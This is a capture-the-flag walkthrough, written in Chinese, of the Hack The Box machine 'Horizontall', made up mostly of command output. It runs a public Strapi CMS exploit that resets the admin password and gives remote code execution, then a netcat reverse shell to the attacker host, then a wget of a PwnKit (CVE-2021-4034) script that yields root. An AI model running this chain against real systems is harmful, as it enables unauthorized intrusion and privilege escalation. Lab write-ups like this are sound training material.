nmap
```
┌──(root💀kali)-[~]
└─# nmap -sV 10.10.11.105     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 09:30 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds

```


掃描目錄 沒什麼東西
```
┌──(root💀kali)-[/usr/share/wordlists]
└─# gobuster dir -u http://horizontall.htb/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,phtml,sh
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php,phtml,sh
[+] Timeout:                 10s
===============================================================
2022/02/02 09:27:15 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]                                  
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 

```
F12 看到裡面的JS 進去之後搜尋htb 能看到另一個子域名
```
http://horizontall.htb/js/app.c68eb462.js


http://api-prod.horizontall.htb/reviews
```
訪問後看到
```
[{"id":1,"name":"wail","description":"這是很好的服務","stars":4,"created_at":"2021-05-29T13:23:38.000Z", "updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"我對產品很滿意","stars" :5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":" john","description":"以最低價格創建服務，我希望將來可以購買更多","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at" :"2021-05-29T13:25:26.000Z"}]
```

再掃一次目錄
```
┌──(root💀kali)-[/home/kali]
└─# gobuster dir -u http://api-prod.horizontall.htb/ -t 60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,phtml,sh 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,html,txt,php,phtml
[+] Timeout:                 10s
===============================================================
2022/02/02 09:31:54 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 413]
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60] 
/admin                (Status: 200) [Size: 854]
/Reviews              (Status: 200) [Size: 507]
/robots.txt           (Status: 200) [Size: 121]
/Users                (Status: 403) [Size: 60] 
/Admin                (Status: 200) [Size: 854]

```
進入/amdin 看到CMS

https://www.exploit-db.com/exploits/50239
```
┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 50239.py http://api-prod.horizontall.htb/                                                                                                                                                                                130 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODEyOTY2LCJleHAiOjE2NDY0MDQ5NjZ9.f5NAqcOhXzp5eiFaTF46EPs3wOr195UP0JJJMqE4qYg

```
`[+] Your new credentials are: admin:SuperStrongPassword1` 用這個登陸


然後用剛剛下載的exploit執行 連上我的nc
```
┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 50239.py http://api-prod.horizontall.htb/                                130 ⨯
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODE1ODk2LCJleHAiOjE2NDY0MDc4OTZ9.qa3lY3RfZpPOjfBggp0ar3EajIVqTdWGg8rtoJf7_Fg


$> nc 10.10.14.26 8888
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}

```
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# nc -nvlp 8888                                                                      1 ⨯
listening on [any] 8888 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.105] 47868
bash: cannot set terminal process group (1798): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ whoami
whoami
strapi
strapi@horizontall:~/myapi$ 
```
上傳一個CVE-2021-4034 
```
wget 10.10.14.26/CVE-2021-4034.py
--2022-02-02 15:43:01--  http://10.10.14.26/CVE-2021-4034.py
Connecting to 10.10.14.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

     0K ...                                                   100% 2.61M=0.001s

2022-02-02 15:43:01 (2.61 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]

strapi@horizontall:/tmp$ ls
ls
CVE-2021-4034.py
f
pwnkit.so
systemd-private-67c74e360d434949a6111366e4128946-systemd-timesyncd.service-TIQz0R
test-polkit
trans.py
vmware-root_877-4022177778
strapi@horizontall:/tmp$ chmod +x CVE-2021-4034.py
chmod +x CVE-2021-4034.py
strapi@horizontall:/tmp$ python CVE-2021-4034.py
python CVE-2021-4034.py
whoami
root


```